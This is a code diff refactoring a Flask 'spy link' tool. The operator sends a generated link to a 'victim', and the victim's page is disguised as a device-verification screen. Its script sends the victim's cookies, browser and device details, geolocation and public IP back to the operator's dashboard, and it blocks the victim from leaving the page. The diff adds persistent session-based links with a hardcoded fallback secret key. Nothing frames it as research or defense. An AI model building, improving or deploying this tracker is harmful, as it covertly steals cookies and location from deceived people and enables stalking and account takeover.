@@ -1,14 +1,16 @@
 # -*- coding: utf-8 -*-
 import os
 import uuid
-import json
 from datetime import datetime
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string, redirect, session
 
 app = Flask(__name__)
+app.secret_key = os.environ.get('SECRET_KEY', 'supersecretkey2025')  #      
+
+#   ()
 reports = {}
 
-# ---------- ড্যাশবোর্ড HTML (সহজ, কার্যকর) ----------
+#  HTML (UID   )
 DASHBOARD = """
 <!DOCTYPE html>
 <html>
@@ -28,20 +30,19 @@ DASHBOARD = """
 </head>
 <body>
 <div class="card">
-    <h2>📡 SPY LINK GENERATOR</h2>
-    <form method="get" action="/dashboard">
-        <input type="text" name="uid" placeholder="Enter UID to view existing" value="{{ uid_input }}">
-        <button type="submit">Load UID</button>
-    </form>
-    <p><strong>Current UID:</strong> {{ uid }}</p>
+    <h2> SPY DASHBOARD</h2>
+    <p><strong>Your persistent UID:</strong> {{ uid }}</p>
     <div>
         <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
         <button onclick="copyLink()">Copy Link</button>
     </div>
-    <p>⚠️ Send this link to victim. Data will appear below automatically.</p>
+    <form method="post" action="/new_uid" style="display:inline;">
+        <button type="submit" style="background:#ff3366;"> Generate New Link (New UID)</button>
+    </form>
+    <p> Send current link to victim. Data stays with this UID until you create a new one.</p>
 </div>
 <div class="card">
-    <h3>📥 Received Data (UID: {{ uid }})</h3>
+    <h3> Received Data (UID: {{ uid }})</h3>
     <button onclick="location.reload()">Refresh</button>
     <div id="data">
         {% if reports[uid] and reports[uid].data %}
@@ -52,7 +53,7 @@ DASHBOARD = """
                 </div>
             {% endfor %}
         {% else %}
-            <p>⏳ No data yet. Ask victim to click the link.</p>
+            <p> No data yet. Send the link to victim.</p>
         {% endif %}
     </div>
 </div>
@@ -63,14 +64,14 @@ DASHBOARD = """
         navigator.clipboard.writeText(inp.value);
         alert('Link copied!');
     }
-    // Auto-refresh every 5 seconds
+    // auto refresh every 5 seconds
     setInterval(() => location.reload(), 5000);
 </script>
 </body>
 </html>
 """
 
-# ---------- ভিকটিম পেজ (স্পাই কোড) সরল ও নিশ্চিত ----------
+#   ( )
 SPY_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -80,13 +81,12 @@ SPY_PAGE = """
     <style>body{background:#000;color:#0f0;text-align:center;padding-top:20%;font-family:monospace;}</style>
 </head>
 <body>
-    <h2>🔐 Secure connection established</h2>
+    <h2> Secure connection established</h2>
     <p>Please wait while we verify your device...</p>
     <script>
         (async function() {
             const server = "{{ server }}";
             const uid = "{{ uid }}";
-            // Function to send data
             async function sendData(data) {
                 try {
                     let response = await fetch(server + '/api/report/' + uid, {
@@ -94,54 +94,33 @@ SPY_PAGE = """
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(data)
                     });
-                    if (response.ok) console.log('Data sent successfully');
-                    else console.error('Send failed', response.status);
-                } catch(e) {
-                    console.error('Fetch error:', e);
-                }
+                    if (!response.ok) console.error('Send failed', response.status);
+                } catch(e) { console.error(e); }
             }
-            
-            // Collect basic info
             let victimData = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: screen.width + 'x' + screen.height,
-                colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookies: document.cookie,
                 localStorageSize: localStorage.length,
                 url: window.location.href,
                 timestamp: new Date().toISOString()
             };
-            
-            // Send immediately
             await sendData(victimData);
-            
-            // Try to get location (may ask permission)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    position => {
-                        let loc = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        sendData({ location: loc });
-                    },
-                    error => console.log('Geolocation denied or error')
+                    pos => sendData({ location: {lat: pos.coords.latitude, lon: pos.coords.longitude} }),
+                    () => {}
                 );
             }
-            
-            // Get public IP using free API
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 await sendData({ ip: ipData.ip });
-            } catch(e) { console.log('IP fetch failed'); }
-            
-            // Optional: keep page busy (so victim stays)
-            window.onbeforeunload = function() { return true; };
+            } catch(e) {}
+            window.onbeforeunload = () => true;
         })();
     </script>
 </body>
@@ -154,16 +133,23 @@ def home():
 
 @app.route('/dashboard')
 def dashboard():
-    uid_input = request.args.get('uid', '')
-    if uid_input and uid_input in reports:
-        uid = uid_input
-    else:
-        uid = str(uuid.uuid4())[:8]
-        if uid not in reports:
-            reports[uid] = {'data': []}
-    # লিংক তৈরি
+    #   UID ,     
+    if 'uid' not in session:
+        session['uid'] = str(uuid.uuid4())[:8]
+        #   UID-    
+        if session['uid'] not in reports:
+            reports[session['uid']] = {'data': []}
+    uid = session['uid']
     link = request.host_url.rstrip('/') + '/spy/' + uid
-    return render_template_string(DASHBOARD, link=link, uid=uid, uid_input=uid_input, reports=reports)
+    return render_template_string(DASHBOARD, link=link, uid=uid, reports=reports)
+
+@app.route('/new_uid', methods=['POST'])
+def new_uid():
+    #  UID      
+    session['uid'] = str(uuid.uuid4())[:8]
+    if session['uid'] not in reports:
+        reports[session['uid']] = {'data': []}
+    return redirect('/dashboard')
 
 @app.route('/spy/<uid>')
 def spy(uid):
